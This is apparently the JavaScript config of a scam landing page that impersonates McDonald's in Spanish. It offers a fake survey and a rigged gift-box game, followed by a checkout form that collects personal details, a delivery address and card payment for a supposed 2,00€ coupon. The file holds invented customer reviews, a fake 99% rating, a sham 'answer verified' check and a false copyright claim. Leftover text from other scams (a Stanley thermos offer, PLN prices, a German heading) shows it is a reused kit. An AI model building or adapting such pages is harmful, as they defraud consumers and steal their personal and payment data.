const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "es";
  const lang = "es-ES";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Talla: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };
  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "McDonald's menu",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "Cupón descuento",
    text: `,
Felicidades!<br><br>
Participaste en la promoción de Stanley: tienes la oportunidad de comprar el termo con molde para hielo STANLEY QUENCHER H2.0 por solo <b>$37</b>!
`,
  };

  const notifications = [
    // {
    // 	user: "Manuel S*****",
    // 	location: "Barcelona, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 15 segundos",
    // },
    // {
    // 	user: "Carlos B******",
    // 	location: "Madrid, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 25 segundos",
    // },
  ];

  const reviewsArr = [
    {
      name: "José",
      time: "Hace 1 día",
      header: "Es increíble!",
      product: "26468782",
      review:
        "Como un cliente de muchos años, me sorprendió mucho que me trajeran mi menú favorito a un precio tan razonable 😊",
    },
    {
      name: "María",
      time: "Hace 2 días",
      header: "Fantástico! Me quedo sin palabras.",
      product: "26468789",
      review:
        "Decidí participar por primera vez en este tipo de promoción y ya tengo el menú, gracias.",
    },
    {
      name: "Carlos",
      time: "Hace 2 días",
      header: "Simplemente genial.",
      product: "26468785",
      review: "Estaba delicioso, suficiente para toda la familia, e incluso sobró.",
    },
    {
      name: "Ana",
      time: "Hace 4 días",
      header: "Me gusta",
      review:
        "Sinceramente, me encantan las comidas rápidas y esta promoción era justo para mí.",
    },
    {
      name: "Luis",
      time: "Hace 7 días",
      header: "Wow, absolutamente amo este producto!",
      product: "26468784",
      review:
        "Debe ser una broma! Al principio pensé que era una estafa por el precio, pero afortunadamente persistí y ordené, gracias.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "MEINUNGEN UND BEWERTUNGEN",
    percent: "99%",
    rec: "Comentarios sobre esta promoción",
  };

  const questions = {
    _of: "Pregunta {1} de {2}: ",
    arr: [
      {
        q: "Alguna vez has pedido productos de McDonald's?",
        a: [
          "Sí, pido con frecuencia",
          "Sí, pido raramente",
          "No he pedido antes",
        ],
      },
      {
        q: "Debería McDonald's continuar con tales campañas publicitarias?",
        a: ["Sí, por supuesto!", "Sí, pero cambien el menú promocional", "No"],
      },
      {
        q: "Recomendarías nuestros productos a tus amigos?",
        a: ["Sí", "No"],
      },
    ],
  };

  const check = {
    title: "Tu respuesta será revisada.",
    arr: [
      "Has respondido la pregunta 3 de 3.",
      "Tu dirección IP no te informa sobre solicitudes anteriores.",
      "Tu respuesta ha sido verificada.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Gracias por participar en la encuesta!",
        button: "Probar suerte",
        text: `
<center>
    Para obtener un menú de McDonald's a precio promocional, debes elegir la caja de regalo correcta.
          <br><br>
       Tienes 3 intentos, buena suerte!
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "Inténtalo de nuevo",
        text: `
        <center>
       Desafortunadamente, este regalo está vacío! Te quedan 2 intentos - buena suerte!
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "Felicidades, has obtenido un descuento en el menú seleccionado!",
        button: "Recoger el cupón",
        text: `
<center>
  <p style="color: #b51817">
  </p>
  <br>
  1) Haga clic en «Recoger el cupón», complete el formulario de entrega y pague el pedido.
   <br><br>
  2) Dentro de una hora, recibirá un mensaje de texto con su cupón y las instrucciones para activarlo.
  <br><br>
  3) El cupón se puede activar en cualquier momento, no es necesario volver a pagar.
</center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Información personal",
      fields: {
        name: {
          enabled: true,
          field: "Nombre",
        },
        family: {
          enabled: true,
          field: "Apellido",
        },
        phone: {
          enabled: true,
          field: "Número de teléfono",
        },
        email: {
          enabled: true,
          field: "Correo electrónico",
        },
      },
    },
    delivery: {
      title: "Entrega",
      fields: {
        city: {
          enabled: true,
          field: "Ciudad",
        },
        address: {
          enabled: true,
          field: "Dirección de entrega",
        },
        zip: {
          enabled: true,
          field: "Código postal",
        },
      },
    },
    payment: {
      title: "Métodos de pago",
      creditCard: "Pago en línea con tarjeta de crédito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Detalles del pedido",
      oldPrice: "123,74 PLN",
      newPrice: "2,00€",
      size: "Talla",
      subTotal: {
        title: "Valor del pedido",
        amount: "2,00€",
      },
      delivery: {
        title: "Entrega",
        amount: "0,00€",
      },
      total: {
        title: "Total",
        amount: "2,00€",
      },
      checkoutButton: "Paga por tu pedido",
    },
  };

  const products = [
      {
      id: "26468784",
      name: "Pack Family",
      miniImg: "./src/slide3.png",

      images: ["./src/slide3.png"],
    },
    {
      id: "26468782",
      name: "Pack Duo",
      miniImg: "./src/slide1.png",

      images: ["./src/slide1.png"],
    },
    {
      id: "26468783",
      name: "Pack Trio",
      miniImg: "./src/slide2.png",

      images: ["./src/slide2.png"],
    },

  ];

  const footer = {
    cr: "© 2024 McDonald's. Reservados todos los derechos.",
  };

  const pathImgBox = {
    lid: "./src/box-lid.png",
    lidIOs: "./src/box-lid-ios.png",
    inner: "./src/box-inner.png",
    innerGift: "./src/box-inner-gift.png",
    box: "./src/box.png",
    boxModal: "./src/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});